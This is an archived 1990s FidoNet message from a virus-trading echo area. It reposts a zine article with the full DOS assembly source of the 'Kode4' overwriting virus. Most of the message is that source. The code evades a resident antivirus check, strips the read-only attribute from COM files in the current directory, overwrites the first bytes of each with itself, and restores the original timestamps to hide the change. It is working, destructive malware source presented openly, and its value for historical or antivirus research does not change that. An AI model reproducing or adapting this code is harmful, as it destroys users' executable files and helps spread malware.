;Ä PVT.VIRII (2:465/65.4) ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ PVT.VIRII Ä
; Msg  : 6 of 54
; From : MeteO                               2:5030/136      Tue 09 Nov 93 09:11
; To   : -  *.*  -                                           Fri 11 Nov 94 08:10
; Subj : KOD4_129.ASM
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;.RealName: Max Ivanov
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;* Kicked-up by MeteO (2:5030/136)
;* Area : VIRUS (Int: ˆ­ä®p¬ æ¨ï ® ¢¨pãá å)
;* From : Mikko Hypponen, 2:283/718 (06 Nov 94 16:23)
;* To   : Hans Schotel
;* Subj : KOD4_129.ASM
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
;@RFC-Path:
;ddt.demos.su!f400.n5020!f3.n5026!f2.n51!f550.n281!f512.n283!f35.n283!f7.n283!f7
;18.n283!not-for-mail
;@RFC-Return-Receipt-To: Mikko.Hypponen@f718.n283.z2.fidonet.org
;ÄÄÄÄÄÄÄÄÄÍÍÍÍÍÍÍÍÍ>>> Article From Evolution #2 - YAM '92

;Article Title: Kode 4 v1 Virus
;Author: Soltan Griss


;######################################################################
;#  Name:  Kode4 version 1.0 (overwritting stage)
;#  Author:  Soltan Griss  [YAM]
;#
;#  Description: What this sucker does is very simple. it overwrites
;#               the first 46 bytes of all com files in the current
;#               directory, with it's own code... as of scanv93, this
;#               virus is undetectable..
;#
;#
;#  Special Thanks go out to Data Disruptor.. If it were not for you i
;#          would still be fucking lost!!!!
;#
;######################################################################

seg_a           segment byte public
                assume  cs:seg_a, ds:seg_a


                org     100h
V_Length        equ     last-start
KODE4           proc    far

start           label   near            ;Check for Virex installiation

                mov     ax,0ff0fh
                int     21h
                cmp     ax,0101h        ;Abort if Virex Protection
                je      done            ; present


                mov     ah,4Eh             ;Find first Com file
                mov     dx,offset filename ;use "*.com"
                int     21h

Back:
                mov     ah,43h              ;get rid of read only
                mov     al,0
                mov     dx,9eh
                int     21h
                mov     ah,43h
                mov     al,01
                and     cx,11111110b
                int     21h

                mov     ax,3D01h           ;Open file for writing
                mov     dx,9Eh             ;get file name from file DTA
                int     21h

                mov     bx,ax               ;save handle in bx
                mov     ah,57h              ;get time date
                mov     al,0
                int     21h

                push    cx                  ;put in stack for later
                push    dx


                mov     dx,100h            ;Start writing at 100h
                mov     cl,v_length        ;write 46 bytes
                mov     ah,40h             ;Write Data into the file
                int     21h


                pop     dx                 ;Restore old dates and times
                pop     cx
                mov     ah,57h
                mov     al,01h
                int     21h



                mov     ah,3Eh             ;Close the file
                int     21h

                mov     ah,4Fh             ;Find Next file
                int     21h

                jnc     Back
                mov     ah,9h
                mov     dx,offset DATA
                int     21h

done:           int     20h                ;Terminate Program
filename        db      "*.c*",0
DATA            db      " -=+ Kode4 +=-, The one and ONLY!$"


kode4           endp
LAST            label near
seg_a           ends
                end     start

;-+-  FMail 0.96â
; + Origin: I just hate people who create virusses... (2:283/718)
;=============================================================================
;
;Yoo-hooo-oo, -!
;
;
;    þ The MeÂeO
;
;/x            No map file at all
;
;--- Aidstest Null: /Kill
; * Origin: ùPVT.ViRIIúmainúboardú / Virus Research labs. (2:5030/136)

